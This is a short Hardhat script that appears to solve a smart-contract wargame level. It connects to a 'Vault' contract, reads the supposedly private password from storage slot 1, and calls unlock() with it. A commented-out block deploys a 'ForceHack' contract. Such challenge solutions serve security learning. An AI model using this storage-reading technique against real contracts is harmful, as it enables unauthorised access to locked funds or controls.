const { ethers } = require("hardhat");
const hre = require("hardhat");

const main = async () => {
  /*const contractFactory = await hre.ethers.getContractFactory("ForceHack");
  const forceHack = await contractFactory.deploy();
  await forceHack.deployed();
  console.log("=== forceHack contract deployed to ", forceHack.address);
  */
  console.log("===CONNECTING===");
  const address = "0x6A85F4cb606cBe489C57e67792D6db5A4DF45029";
  const name = "Vault";
  const signer = await hre.ethers.getSigner();
  const contract = await hre.ethers.getContractAt(name, address, signer);
  console.log("===READING===");
  console.log(
    "slot 0 - locked? :",
    String(await hre.ethers.provider.getStorageAt(contract.address, 0))
  );
  console.log(
    "slot 1 - password: ",
    String(await hre.ethers.provider.getStorageAt(contract.address, 1))
  );
  await contract.unlock(
    "0x412076657279207374726f6e67207365637265742070617373776f7264203a29"
  );
  console.log(
    "slot 0 - locked? :",
    String(await hre.ethers.provider.getStorageAt(contract.address, 0))
  );
  console.log("=== DONE ===");
};

const runMain = (async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
})();
